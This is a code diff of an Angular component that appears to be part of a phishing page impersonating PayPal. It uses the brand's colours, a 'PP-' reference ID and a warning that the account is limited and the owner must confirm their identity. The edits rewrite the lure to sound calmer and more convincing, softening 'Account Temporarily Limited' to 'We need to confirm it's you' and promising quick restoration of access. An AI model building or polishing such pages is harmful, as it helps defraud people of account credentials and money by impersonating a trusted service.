@@ -16,11 +16,11 @@ import { StateService } from '../services/state.service';
         </div>
         
         <h1 class="text-xl font-bold text-slate-900 mb-3">
-          Account Temporarily Limited
+          We need to confirm it's you
         </h1>
         
         <p class="text-sm text-slate-600 leading-relaxed mb-8 max-w-sm">
-          We've noticed some unusual activity on your account. To ensure your security, we need you to confirm your identity before restoring full access.
+          We noticed a login from a device we don't recognize. To keep your account secure, we just need to verify your identity. It will only take a moment to get you back on track.
         </p>
 
         <div class="w-full space-y-4">
@@ -28,14 +28,14 @@ import { StateService } from '../services/state.service';
             (click)="verify()"
             class="w-full bg-[#003087] hover:bg-[#002569] text-white font-bold py-3.5 px-4 rounded-full transition-all duration-200 shadow-sm text-[15px]"
           >
-            Verify Identity
+            Confirm Identity
           </button>
 
           <button 
             (click)="showDialog.set(true)"
             class="w-full text-[#0070ba] font-semibold text-sm hover:underline py-2"
           >
-            Why is my account limited?
+            Why do I need to do this?
           </button>
         </div>
       </div>
@@ -46,7 +46,7 @@ import { StateService } from '../services/state.service';
            <div class="absolute inset-0 bg-black/40 backdrop-blur-sm" (click)="showDialog.set(false)"></div>
            <div class="bg-white rounded-xl shadow-2xl w-full max-w-md p-6 relative z-10 animate-in fade-in zoom-in duration-200">
               <div class="flex justify-between items-start mb-4">
-                 <h3 class="font-bold text-lg text-slate-900">Limitation Details</h3>
+                 <h3 class="font-bold text-lg text-slate-900">Security Notice</h3>
                  <button (click)="showDialog.set(false)" class="text-slate-400 hover:text-slate-700">
                     <span class="material-icons">close</span>
                  </button>
@@ -54,10 +54,11 @@ import { StateService } from '../services/state.service';
               <div class="space-y-4 text-sm text-slate-600">
                  <p>Reference ID: <strong>PP-005-{{ state.sessionId() }}</strong></p>
                  <div class="bg-amber-50 border-l-4 border-amber-500 p-3">
-                    <p class="font-bold text-amber-800">Unusual Login Attempt</p>
-                    <p class="text-xs mt-1">We detected a login from a new device or location that doesn't match your history.</p>
+                    <p class="font-bold text-amber-800">New Device Detected</p>
+                    <p class="text-xs mt-1">We noticed a login from a location or device that doesn't match your usual activity.</p>
                  </div>
-                 <p>For your protection, certain account features including sending, withdrawing, and closing your account have been disabled.</p>
+                 <p>To protect your account, we've temporarily limited some features (like sending money or withdrawing funds) until we can confirm you are the account owner.</p>
+                 <p>Once you verify your identity, your full account access will be restored immediately.</p>
               </div>
               <button (click)="showDialog.set(false)" class="w-full mt-6 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold py-3 rounded-lg transition-colors">
                  Close
